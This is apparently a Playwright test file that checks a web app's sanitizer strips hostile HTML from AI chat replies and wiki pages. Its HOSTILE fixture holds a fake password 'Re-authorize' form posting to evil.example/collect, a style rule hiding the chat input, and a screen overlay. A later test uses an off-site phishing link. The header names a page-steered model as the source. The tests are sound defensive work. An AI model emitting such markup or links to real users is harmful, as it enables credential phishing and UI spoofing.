// sanitize.spec.ts — what rendered markdown may contain. Model output
// (steered by a page it read) and shared wiki pages are untrusted HTML:
// no <style> that restyles the app, no forms or buttons that look like
// the app, no inline styles that position an overlay. Task-list
// checkboxes still render.

import { test as base, expect, Page } from "@playwright/test";
import { start, GatewayStack } from "../fixtures/gateway";
import { createTestUser, attachSession, TestUser } from "../fixtures/user";

const test = base.extend<{}, { stack: GatewayStack }>({
    stack: [
        async ({}, use) => {
            const stack = await start({ admin: true });
            await use(stack);
            await stack.stop();
        },
        { scope: "worker" },
    ],
});

const HOSTILE =
    "Done.\n\n" +
    "<style>.chat-input-wrap, .notes-shell { display: none !important; }</style>\n\n" +
    '<form action="https://evil.example/collect" method="post"><input name="pw" type="password"><button>Re-authorize</button></form>\n\n' +
    '<div class="overlay-probe" style="position:fixed;inset:0;background:red">X</div>\n\n' +
    "- [x] milk\n- [ ] eggs\n";

async function openChat(page: Page, stack: GatewayStack) {
    await page.goto(stack.workspaceURL);
    await expect(page.locator("#view-dashboard")).toBeVisible({ timeout: 15_000 });
    await page.locator(".sidebar-cat-chat").click();
    const shell = page.locator(".chat-shell").first();
    await expect(shell).toBeVisible({ timeout: 10_000 });
    await page.evaluate(() => {
        window.dispatchEvent(new CustomEvent("familiar:openDoc", { detail: { surface: "chat" } }));
    });
    await expect(shell.locator(".chat-input")).toBeVisible({ timeout: 10_000 });
    return shell;
}

test("a reply's HTML can't restyle the app or add forms, and task lists still render", async ({ stack, browser }) => {
    const user = await createTestUser();
    const ctx = await browser.newContext();
    await attachSession(ctx, stack.workspaceURL, user);
    const page = await ctx.newPage();
    try {
        const shell = await openChat(page, stack);
        await page.route("**/api/chat", (route) =>
            route.fulfill({
                status: 200,
                contentType: "text/event-stream",
                body:
                    'event: session\ndata: {"session_id":"s","persists_reply":true}\n\n' +
                    "event: done\ndata: " + JSON.stringify({ content: HOSTILE }) + "\n\n",
            }),
        );
        await shell.locator(".chat-input").fill("hello");
        await shell.locator(".chat-send-btn").click();
        const reply = shell.locator(".chat-msg").last();
        await expect(reply).toContainText("milk", { timeout: 10_000 });

        await expect(reply.locator("style")).toHaveCount(0);
        await expect(reply.locator("form, button, input[type=password]")).toHaveCount(0);
        await expect(shell.locator(".chat-input")).toBeVisible(); // not hidden by an injected <style>
        await expect(reply.locator(".overlay-probe")).not.toHaveAttribute("style", /.+/);
        const boxes = reply.locator("input[type=checkbox]");
        await expect(boxes).toHaveCount(2);
        await expect(boxes.first()).toBeDisabled();
    } finally {
        await ctx.close();
    }
});

test("the editor sanitizes with the shared policy, not TOAST UI's bundled DOMPurify 2.3.3", async ({
    stack,
    browser,
    request,
}) => {
    const user: TestUser = await createTestUser();
    const resp = await request.post(`${stack.workspaceURL}/console/api/books/personal/pages`, {
        headers: { Cookie: user.cookieHeader, "Content-Type": "application/json" },
        data: { title: "hostile", content: HOSTILE },
    });
    expect(resp.ok()).toBeTruthy();
    const note = await resp.json();
    const ctx = await browser.newContext();
    await attachSession(ctx, stack.workspaceURL, user);
    const page = await ctx.newPage();
    try {
        await page.goto(stack.workspaceURL);
        await expect(page.locator("#view-dashboard")).toBeVisible({ timeout: 15_000 });
        await page.locator(".sidebar-cat-notes").click();
        const shell = page.locator(".notes-shell").first();
        await expect(shell).toBeVisible({ timeout: 10_000 });
        await page.evaluate((id) => {
            window.dispatchEvent(new CustomEvent("familiar:openDoc", { detail: { surface: "notes", id } }));
        }, note.id);
        const editor = shell.locator(".toastui-editor-ww-container .ProseMirror").first();
        await expect(editor).toContainText("milk", { timeout: 10_000 });

        await expect(shell).toBeVisible();
        const root = shell.locator(".toastui-editor-defaultUI");
        await expect(root.locator("style")).toHaveCount(0);
        await expect(root.locator("form, button.evil, input[type=password]")).toHaveCount(0);
        // The bundled 2.3.3 sanitizer keeps style attributes; the shared
        // policy drops one that isn't a plain width.
        const probe = root.locator(".overlay-probe").first();
        await expect(probe).toBeAttached();
        await expect(probe).not.toHaveAttribute("style", /position/);
        const used = await page.evaluate(() => (window as any).DOMPurify && (window as any).DOMPurify.version);
        expect(used, "standalone DOMPurify version").toBe("3.4.16");
    } finally {
        await ctx.close();
    }
});

// A research card's "Open" button only ever links inside the app.
test("a research card never links off-site", async ({ stack, browser }) => {
    const user = await createTestUser();
    const ctx = await browser.newContext();
    await attachSession(ctx, stack.workspaceURL, user);
    const page = await ctx.newPage();
    try {
        await page.goto(stack.workspaceURL);
        await expect(page.locator("#view-dashboard")).toBeVisible({ timeout: 15_000 });
        await page.waitForFunction(() => !!(window as any).familiarResearchCard);
        const hrefs = await page.evaluate(() => {
            const card = (window as any).familiarResearchCard;
            const hrefOf = (html: string) => {
                const d = document.createElement("div");
                d.innerHTML = html;
                const a = d.querySelector("a.rc-note");
                return a ? a.getAttribute("href") : null;
            };
            return {
                offsite: hrefOf(card.html("topic: t\nnote: https://evil.example/login\ntitle: Your note")),
                inapp: hrefOf(card.html("topic: t\nnote: #note/research/findings\ntitle: Your note")),
                slugs: hrefOf(card.html("topic: t\nbook: research\npage: findings\ntitle: Your note")),
            };
        });
        expect(hrefs.offsite, "off-site note link").toBeNull();
        expect(hrefs.inapp).toBe("#note/research/findings");
        expect(hrefs.slugs).toBe("#note/research/findings");
    } finally {
        await ctx.close();
    }
});
